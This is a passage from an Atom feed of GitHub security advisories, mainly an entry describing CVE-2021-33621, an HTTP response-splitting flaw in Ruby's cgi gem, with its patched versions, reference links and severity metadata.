<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20221228-0004/">https://security.netapp.com/advisory/ntap-20221228-0004/</a></li>
<li><a href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5">https://github.com/advisories/GHSA-vc47-6rqg-c7f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-19T00:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] HTTP response splitting in CGI]]></title>
        <id>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</id>
        <link href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5"/>
        <updated>2022-12-30T00:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>Ruby gem cgi.rb prior to versions 0.3.5, 0.2.2 and 0.1.0.2 allow HTTP header injection. If a CGI application using the CGI library inserts untrusted input into the HTTP response header, an attacker can exploit it to insert a newline character to split a header, and inject malicious content to deceive clients. This issue has been patched in versions 0.3.5, 0.2.2 and 0.1.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33621">https://nvd.nist.gov/vuln/detail/CVE-2021-33621</a></li>
<li><a href="https://hackerone.com/reports/1204695">https://hackerone.com/reports/1204695</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/">https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20221228-0004/">https://security.netapp.com/advisory/ntap-20221228-0004/</a></li>
<li><a href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5">https://github.com/advisories/GHSA-vc47-6rqg-c7f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-19T00:30:55.000Z</published>
    </entry>
</feed>